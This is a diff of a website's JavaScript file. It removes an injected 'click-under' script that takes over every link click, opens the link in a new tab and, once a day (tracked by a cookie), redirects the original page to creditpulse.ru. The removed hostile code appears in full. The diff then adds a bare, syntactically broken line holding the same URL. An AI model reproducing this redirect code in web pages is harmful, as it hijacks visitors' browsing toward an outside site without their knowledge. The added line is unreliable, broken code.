@@ -137,34 +137,6 @@ $('.drop-menu__item').click(function () {
 });
 
 
-function() {
-  const e = "clickUnderSeen"
-    , t = () => "true" !== (e => {
-      const t = document.cookie.match(new RegExp(`(?:^|; )${encodeURIComponent(e)}=(.*)`));
-      return t ? decodeURIComponent(t[1]) : void 0
-  }
-  )(e)
-    , n = n => {
-      n.preventDefault();
-      const i = n.target.closest("a");
-      i && (window.open(i.href, "_blank"),
-      t() && (( (e, t, n) => {
-          const i = new Date;
-          i.setTime(i.getTime() + 24 * n * 60 * 60 * 1e3),
-          document.cookie = `${encodeURIComponent(e)}=${encodeURIComponent(t)};expires=${i.toUTCString()};path=/`
-      }
-      )(e, "true", 1),
-      window.location.href = "https://creditpulse.ru/"))
-  }
-  ;
-  document.addEventListener("DOMContentLoaded", ( () => {
-      document.querySelectorAll("a").forEach((e => {
-          e.addEventListener("click", n)
-      }
-      ))
-  }
-  ))
-}();
-
+https://creditpulse.ru/
 
  
